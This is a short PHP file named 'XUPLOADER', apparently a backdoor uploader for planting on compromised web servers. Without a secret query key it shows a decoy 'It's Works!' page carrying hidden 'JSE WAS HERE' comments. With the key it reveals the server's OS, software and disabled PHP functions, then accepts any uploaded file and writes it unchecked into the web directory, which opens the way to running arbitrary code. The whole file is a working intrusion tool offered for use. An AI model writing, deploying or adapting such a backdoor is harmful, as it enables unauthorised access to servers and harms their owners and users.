<?php
##########################
# Title   : XUPLOADER    #
# Version : V0.1         #
# Author  : JSE 		 #
# May 19th 2020          #
##########################
# filename : xup.php     #
# .php?x Key             #
##########################
$key = "";
function b($f, $c="green"){
	$output = "<strong style='color:".$c."'>".$f."</strong>";
	return $output;
}
function pre($f){
	$output = "<pre>".$f."</pre>";
	return $output;
}

if(empty($key)){ $k = "x"; } else {	$k = $key;}

	if (isset($_GET[$k])) {
		$uname = php_uname();
		$server= $_SERVER['SERVER_SOFTWARE'];
		$df = ini_get("disable_functions");
		if(empty($df)){
			$disfunc = b("None");
		}else{
			$disfunc = b($df,"red");	
		}

		$t1 = b("SERVERINFO","blue") ." = { \"".b("OS","orange")."\": \"". b($uname) ."\", \"".b("SOFTWARE","orange")."\": \"".b($server)."\" }";
		$t2	= pre($t1);
		echo $t2;
		echo pre(b("{PHP}Disable") ." = ". $disfunc);
		echo '<form method="POST" action="" class="form-signin"  enctype="multipart/form-data">
				<input type="file" name="f">
				<input type="submit" name="x" value="Upload"></form>';
		if (isset($_POST['x']) && !empty($_FILES['f']['tmp_name'])) {
			if (copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
				$f = $_FILES["f"]["name"];
				echo $_FILES['f']['tmp_name']."<br>";
				echo pre(b("Successfully uploaded. => ".$f));
			} 
			else {
				echo pre(b("Failed T.T","red"));
			}
		}
	}
	else {
		echo "<html>
		<head>
		<title>It's Works</title>
		</head>
		<body>
		<!--JSE WAS HERE-->
		<h1>It's Works!</h1>
		<!--JSE WAS HERE-->
		</body>
		</html>";
	}
?>